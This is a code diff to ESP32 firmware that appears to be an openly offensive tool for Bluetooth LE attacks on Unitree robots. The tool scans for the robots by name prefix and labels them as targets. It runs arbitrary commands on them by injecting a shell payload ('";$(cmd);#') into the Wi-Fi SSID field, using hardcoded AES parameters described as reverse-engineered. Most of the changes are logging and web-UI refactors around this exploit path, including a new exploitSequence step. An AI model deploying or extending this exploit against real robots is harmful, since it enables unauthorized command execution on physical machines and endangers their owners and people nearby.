@@ -30,7 +30,7 @@
 
 // Configuration
 #define SCAN_TIME_SECONDS 30
-#define CHUNK_SIZE 14
+// CHUNK_SIZE is now defined in config.h
 #define MAX_RECENT_DEVICES 5
 
 // Hardcoded AES parameters (from reverse engineering)
@@ -46,6 +46,11 @@ const uint8_t AES_IV[16] = {
 
 const String HANDSHAKE_CONTENT = "unitree";
 const String COUNTRY_CODE = "US";
+
+// External declarations for web interface variables
+#if ENABLE_WEB_INTERFACE
+extern String serialLogBuffer;
+#endif
 
 // Predefined commands
 struct Command {
@@ -90,6 +95,11 @@ Preferences preferences;
 
 // Function declarations
 void styledPrint(const String& message, bool verboseOnly = false);
+void debugPrint(const String& message, const String& category = "DEBUG");
+void infoPrint(const String& message);
+void warningPrint(const String& message);
+void errorPrint(const String& message);
+void successPrint(const String& message);
 String buildPwn(const String& cmd);
 std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data);
 std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data);
@@ -122,6 +132,7 @@ void botDetectionBeeps();
 void feedbackBotDetection();
 #endif
 bool executeCommand(const UnitreeDevice& device, const String& command);
+bool exploitSequence(const String& ssid, const String& password);
 
 void setup() {
     Serial.begin(115200);
@@ -198,6 +209,62 @@ void styledPrint(const String& message, bool verboseOnly) {
     #endif
 }
 
+void debugPrint(const String& message, const String& category) {
+    if (!verbose) return;
+    Serial.print("\033[1;36m[" + category + "]\033[0m ");
+    Serial.println(message);
+    
+    #if ENABLE_WEB_INTERFACE
+    extern void mirrorSerialToWeb(const String& message);
+    String fullMessage = "[" + category + "] " + message;
+    mirrorSerialToWeb(fullMessage);
+    #endif
+}
+
+void infoPrint(const String& message) {
+    Serial.print("\033[1;34m[INFO]\033[0m ");
+    Serial.println(message);
+    
+    #if ENABLE_WEB_INTERFACE
+    extern void mirrorSerialToWeb(const String& message);
+    String fullMessage = "[INFO] " + message;
+    mirrorSerialToWeb(fullMessage);
+    #endif
+}
+
+void warningPrint(const String& message) {
+    Serial.print("\033[1;33m[WARN]\033[0m ");
+    Serial.println(message);
+    
+    #if ENABLE_WEB_INTERFACE
+    extern void mirrorSerialToWeb(const String& message);
+    String fullMessage = "[WARN] " + message;
+    mirrorSerialToWeb(fullMessage);
+    #endif
+}
+
+void errorPrint(const String& message) {
+    Serial.print("\033[1;31m[ERROR]\033[0m ");
+    Serial.println(message);
+    
+    #if ENABLE_WEB_INTERFACE
+    extern void mirrorSerialToWeb(const String& message);
+    String fullMessage = "[ERROR] " + message;
+    mirrorSerialToWeb(fullMessage);
+    #endif
+}
+
+void successPrint(const String& message) {
+    Serial.print("\033[1;32m[SUCCESS]\033[0m ");
+    Serial.println(message);
+    
+    #if ENABLE_WEB_INTERFACE
+    extern void mirrorSerialToWeb(const String& message);
+    String fullMessage = "[SUCCESS] " + message;
+    mirrorSerialToWeb(fullMessage);
+    #endif
+}
+
 String buildPwn(const String& cmd) {
     return "\";$(" + cmd + ");#";
 }
@@ -259,22 +326,22 @@ std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t
 
 bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expectedInstruction) {
     if (response.size() < 5) {
-        styledPrint("[-] Response packet too short");
+        errorPrint("Response packet too short");
         return false;
     }
     
     if (response[0] != 0x51) {
-        styledPrint("[-] Invalid opcode in response");
+        errorPrint("Invalid opcode in response");
         return false;
     }
     
     if (response.size() != response[1]) {
-        styledPrint("[-] Packet length mismatch");
+        errorPrint("Packet length mismatch");
         return false;
     }
     
     if (response[2] != expectedInstruction) {
-        styledPrint("[-] Instruction mismatch: Expected " + String(expectedInstruction) + 
+        errorPrint("Instruction mismatch: Expected " + String(expectedInstruction) + 
                    ", Got " + String(response[2]));
         return false;
     }
@@ -287,7 +354,7 @@ bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expe
     expectedChecksum = (~expectedChecksum + 1) & 0xFF;
     
     if (response[response.size() - 1] != expectedChecksum) {
-        styledPrint("[-] Checksum failure");
+        errorPrint("Checksum validation failed");
         return false;
     }
     
@@ -317,7 +384,7 @@ void displayMenu() {
 void handleMenuChoice(int choice) {
     switch (choice) {
         case 1:
-            styledPrint("Scanning disabled from serial. Use web app at http://192.168.4.1");
+            infoPrint("Scanning disabled from serial. Use web app at http://192.168.4.1");
             break;
         case 2:
             showRecentDevices();
@@ -327,7 +394,7 @@ void handleMenuChoice(int choice) {
             break;
         case 4:
             verbose = !verbose;
-            styledPrint("Verbose mode " + String(verbose ? "enabled" : "disabled"));
+            infoPrint("Verbose mode " + String(verbose ? "enabled" : "disabled"));
             break;
         case 5:
             showPredefinedCommands();
@@ -351,7 +418,7 @@ void handleMenuChoice(int choice) {
             break;
 #endif
         default:
-            styledPrint("[-] Invalid choice");
+            errorPrint("Invalid menu choice");
             break;
     }
 }
@@ -360,16 +427,56 @@ void handleMenuChoice(int choice) {
 class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
     void onResult(BLEAdvertisedDevice advertisedDevice) {
         String deviceName = advertisedDevice.getName().c_str();
+        String deviceAddress = advertisedDevice.getAddress().toString().c_str();
+        int rssi = advertisedDevice.getRSSI();
         
-        // Debug: Show all BLE devices in verbose mode
-        if (verbose && deviceName.length() > 0) {
-            styledPrint("BLE Device: " + deviceName + " (" + advertisedDevice.getAddress().toString().c_str() + ") RSSI: " + String(advertisedDevice.getRSSI()));
+        // Show ALL BLE devices in operations log (not just verbose mode)
+        if (deviceName.length() > 0) {
+            infoPrint("BLE DEVICE: " + deviceName + " (" + deviceAddress + ") RSSI: " + String(rssi) + " dBm");
+        } else {
+            // Show unnamed devices too
+            infoPrint("BLE DEVICE: [UNNAMED] (" + deviceAddress + ") RSSI: " + String(rssi) + " dBm");
         }
         
         // Check if it's a Unitree device
         if (deviceName.startsWith("G1_") || deviceName.startsWith("Go2_") || 
             deviceName.startsWith("B2_") || deviceName.startsWith("H1_") || 
             deviceName.startsWith("X1_")) {
+            
+            // IMMEDIATE detection print - this happens instantly!
+            successPrint("*** UNITREE TARGET DETECTED ***: " + deviceName + " (" + deviceAddress + ") RSSI: " + String(rssi) + " dBm");
+            
+#if ENABLE_WEB_INTERFACE
+            // IMMEDIATE web UI update - don't wait for full processing!
+            String immediateLog = "TARGET FOUND: " + deviceName + " (" + deviceAddress + ") RSSI: " + String(rssi) + " dBm<br>";
+            serialLogBuffer += immediateLog;
+            
+            // IMMEDIATE UI population - add device to list instantly for UI polling
+            UnitreeDevice immediateDevice;
+            immediateDevice.address = deviceAddress;
+            immediateDevice.name = deviceName;
+            immediateDevice.rssi = rssi;
+            immediateDevice.lastSeen = millis();
+            immediateDevice.uuid = "PROCESSING..."; // Will be updated later
+            
+            // Check if already in list (avoid duplicates)
+            bool alreadyExists = false;
+            for (auto& d : discoveredDevices) {
+                if (d.address == deviceAddress) {
+                    // Update existing entry
+                    d.rssi = rssi;
+                    d.lastSeen = millis();
+                    d.name = deviceName;
+                    alreadyExists = true;
+                    break;
+                }
+            }
+            
+            if (!alreadyExists) {
+                // Add immediately so UI polls can see it right away
+                discoveredDevices.push_back(immediateDevice);
+            }
+#endif
             
             UnitreeDevice device;
             device.address = advertisedDevice.getAddress().toString().c_str();
@@ -408,36 +515,29 @@ class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
             
             device.uuid = allUUIDs;
             
-            // Check if already in list
+            // Update existing entry with complete UUID info (device was already added immediately above)
             bool found = false;
             for (auto& d : discoveredDevices) {
                 if (d.address == device.address) {
                     d.rssi = device.rssi;  // Update RSSI
                     d.lastSeen = device.lastSeen;
                     d.name = deviceName;  // Update name in case it changed
+                    d.uuid = device.uuid;  // Update UUID from "PROCESSING..." to actual UUID
                     found = true;
                     break;
                 }
             }
             
             if (!found) {
+                // This should rarely happen since we add immediately above
                 discoveredDevices.push_back(device);
-                styledPrint("Found: " + device.name + " (" + device.address + ") RSSI: " + String(device.rssi));
-                
-            // Log detailed UUID information
-            styledPrint("UUID Debug: haveServiceUUID=" + String(advertisedDevice.haveServiceUUID() ? "YES" : "NO"));
-            if (advertisedDevice.haveServiceUUID()) {
-                styledPrint("Primary UUID: " + String(advertisedDevice.getServiceUUID().toString().c_str()));
             }
-            styledPrint("Service Data Count: " + String(advertisedDevice.getServiceDataCount()));
-            if (advertisedDevice.haveManufacturerData()) {
-                styledPrint("Manufacturer Data: YES (length=" + String(advertisedDevice.getManufacturerData().length()) + ")");
-            }
-            if (advertisedDevice.haveTXPower()) {
-                styledPrint("TX Power: " + String(advertisedDevice.getTXPower()));
-            }
-            styledPrint("Final UUIDs: " + device.uuid);
-                
+            
+            // Log UUID information (clean, no spam)
+            infoPrint("Unitree UUID: " + device.uuid);
+            
+            // Only do feedback and notification for truly new devices
+            if (!found) {
                 // Bot detection feedback - 3 fast beeps and LED pattern
 #if ENABLE_BUZZER || ENABLE_LED_FEEDBACK
                 feedbackBotDetection();
@@ -465,7 +565,7 @@ class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
 };
 
 void scanForDevices() {
-    styledPrint("Scanning for Unitree devices...");
+    infoPrint("Starting BLE scan for Unitree devices...");
     discoveredDevices.clear();
     
     // 2 ascending beeps at scanning start, pause 2 seconds
@@ -482,11 +582,15 @@ void scanForDevices() {
     BLEScanResults* foundDevices = pBLEScan->start(SCAN_TIME_SECONDS, false);
     pBLEScan->clearResults();
     
-    styledPrint("Scan complete. Found " + String(discoveredDevices.size()) + " Unitree devices");
-    
-    // Debug: Print all discovered devices
-    for (int i = 0; i < discoveredDevices.size(); i++) {
-        styledPrint("Device " + String(i) + ": " + discoveredDevices[i].name + " (" + discoveredDevices[i].address + ") RSSI: " + String(discoveredDevices[i].rssi));
+    if (discoveredDevices.size() > 0) {
+        successPrint("Scan complete. Found " + String(discoveredDevices.size()) + " Unitree target(s)");
+        
+        // Summary of discovered devices
+        for (int i = 0; i < discoveredDevices.size(); i++) {
+            infoPrint("Target " + String(i + 1) + ": " + discoveredDevices[i].name + " (" + discoveredDevices[i].address + ") RSSI: " + String(discoveredDevices[i].rssi) + " dBm");
+        }
+    } else {
+        warningPrint("Scan complete. No Unitree devices found in range");
     }
 }
 
@@ -606,20 +710,20 @@ bool executeCommand(const UnitreeDevice& device, const String& command) {
         return false;
     }
     
-    // Build the exploit payload with the command
-    String ssid = buildPwn(command);
-    String password = "testpassword";
+    // Build the exploit payload with the command (per UniPwn research, inject via SSID)
+    String ssid = buildPwn(command);  // Command injection payload for SSID
+    String password = "testpassword";  // Normal password
     
-    // Execute the exploit
-    exploitDevice(ssid, password);
+    // Execute the exploit via validated step-by-step sequence
+    bool success = exploitSequence(ssid, password);
     
     // Disconnect
     if (pClient && pClient->isConnected()) {
         pClient->disconnect();
     }
     
-    Serial.println("[EXPLOIT] Command execution completed");
-    return true;
+    Serial.println(String(success ? "[EXPLOIT] Command execution completed" : "[EXPLOIT] Command execution failed"));
+    return success;
 }
 
 // Configuration storage functions
